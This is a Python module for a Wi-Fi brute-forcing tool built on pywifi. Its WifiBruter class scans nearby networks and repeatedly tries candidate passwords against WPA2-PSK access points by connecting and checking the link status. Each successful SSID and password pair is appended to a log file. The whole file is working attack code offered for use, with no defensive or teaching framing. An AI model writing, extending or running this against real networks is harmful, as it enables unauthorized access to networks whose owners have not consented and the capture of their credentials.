import time
import pywifi
from pywifi import const
from assets.branding import log_status, Y, G, W

class WifiBruter:
    def __init__(self, interface_idx=0, timeout=10):
        self.wifi = pywifi.PyWiFi()
        self.iface = self.wifi.interfaces()[interface_idx]
        self.timeout = timeout

    def scan_targets(self):
        self.iface.scan()
        time.sleep(2)
        return self.iface.scan_results()

    def attempt(self, ssid, password):
        self.iface.disconnect()
        while self.iface.status() == const.IFACE_CONNECTED:
            pass

        profile = pywifi.Profile()
        profile.ssid = ssid
        profile.auth = const.AUTH_ALG_OPEN
        profile.akm.append(const.AKM_TYPE_WPA2PSK)
        profile.cipher = const.CIPHER_TYPE_CCMP
        profile.key = password

        self.iface.remove_all_network_profiles()
        tmp_profile = self.iface.add_network_profile(profile)
        
        self.iface.connect(tmp_profile)
        start_time = time.time()
        
        while time.time() - start_time < self.timeout:
            if self.iface.status() == const.IFACE_CONNECTED:
                return True
            time.sleep(0.5)
        
        return False

    def save_result(self, ssid, password):
        with open("data/logs.txt", "a") as f:
            f.write(f"SSID: {ssid} | PASS: {password}\n")
